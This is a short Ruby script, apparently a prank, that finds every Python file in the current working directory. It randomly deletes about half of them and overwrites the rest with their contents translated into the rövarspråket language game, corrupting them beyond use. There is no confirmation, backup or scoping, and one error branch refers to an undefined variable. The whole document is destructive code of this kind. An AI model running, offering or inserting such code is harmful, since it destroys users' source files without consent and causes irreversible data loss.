/Include the rubyfile responsible for translation of rövarspråket/
require_relative 'rövarspråket.rb'

/Declare and initialize an array that will store the python files/
pythonfiles = []

/Iterate over all the files within the current working directory/
Dir.foreach(Dir.getwd) do |file|
	/Check if the file is of the type .py/
    if (file.include? ".py")
    	/Add the file to the last element in the pythonfiles array/
    	pythonfiles[pythonfiles.length] = file
    end
 end

/Iterate over all the files in the pythonfile array/
for i in 0..pythonfiles.size - 1
	/Generate a random number between one and two/
 	if (rand(1..2) == 1)
 		/Deletes the file if the random number is equal to one and if the file exists/
 		if File.exists?("#{Dir.getwd}/#{pythonfiles[i]}")
 			File.delete("#{Dir.getwd}/#{pythonfiles[i]}")
 		else
 			puts "Could not delete #{pythonfiles[i]}"
 		end
 	else
 		/Declare and initialize a string/
 		text = ""

 		/Open the file of element i in the pythonfiles array with reading-mode/
 		if File.exists?("#{Dir.getwd}/#{pythonfiles[i]}")
	 		File.open("#{Dir.getwd}/#{pythonfiles[i]}", 'r') do |file|
	 			/While there is a line to get it add it to the text variable/
	 			while line = file.gets
	 				text << line
	 			end
	 			/Passes the text string as a argument and translates it to rövarspråket/
	 			text = to_rovarsproket(text) 			
	 		end

	 		/Opens the file of element i in the pythonfiles array with writing-mode/
	 		File.open("#{Dir.getwd}/#{pythonfiles[i]}", 'w') do |file|
	 			/Writes the text string to the file/
	 			file.puts(text)
	 		end
 		else
 			puts "Could not open file #{python[i]}"
 		end
 	end
end